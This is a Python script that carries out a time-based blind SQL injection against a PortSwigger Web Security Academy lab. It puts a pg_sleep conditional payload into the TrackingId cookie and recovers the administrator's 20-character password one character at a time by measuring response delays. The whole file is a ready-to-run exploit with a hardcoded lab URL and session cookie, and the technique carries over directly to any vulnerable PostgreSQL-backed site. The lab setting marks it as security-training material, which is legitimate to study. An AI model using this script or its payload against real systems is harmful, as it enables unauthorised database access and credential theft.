import sys
import requests
import string
import time

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8")

TARGET_URL = "https://0a9b000704da8bbb81d5260700f2009c.web-security-academy.net/"
SESSION_COOKIE = "DE12GWSKEHeREKnh95gm5SMsVAIM1HSu"
TRACKING_ID = "pzOp8OSbTDF81MSw"
SLEEP_SECONDS = 10
THRESHOLD = 8
PASSWORD_LENGTH = 20
USERNAME = "administrator"

CHARSET = string.ascii_lowercase + string.digits

def make_payload(condition):
    return (
        f"{TRACKING_ID}'"
        f"||(SELECT CASE WHEN ({condition}) "
        f"THEN pg_sleep({SLEEP_SECONDS}) ELSE pg_sleep(0) END FROM users)--"
    )

def send_request(payload):
    start = time.time()
    try:
        requests.get(TARGET_URL, cookies={"TrackingId": payload, "session": SESSION_COOKIE}, timeout=SLEEP_SECONDS + 10)
    except requests.exceptions.Timeout:
        pass
    return time.time() - start

def main():
    print("=" * 55)
    print("  PortSwigger Blind SQLi - Cracking 20-char password")
    print("=" * 55)
    password = ""
    for pos in range(1, PASSWORD_LENGTH + 1):
        found = False
        for char in CHARSET:
            condition = f"username='{USERNAME}' AND SUBSTRING(password,{pos},1)='{char}'"
            elapsed = send_request(make_payload(condition))
            print(f"  pos {pos:02d}/{PASSWORD_LENGTH} -> '{char}' ({elapsed:.1f}s)", end="\r")
            if elapsed >= THRESHOLD:
                password += char
                print(f"  [+] pos {pos:02d}: '{char}'  |  password so far: {password}")
                found = True
                break
        if not found:
            print(f"\n  [!] pos {pos:02d}: no match, marking '?'")
            password += "?"
    print("\n" + "=" * 55)
    print(f"  [+] Username : {USERNAME}")
    print(f"  [+] Password : {password}")
    print("=" * 55)

if __name__ == "__main__":
    main()
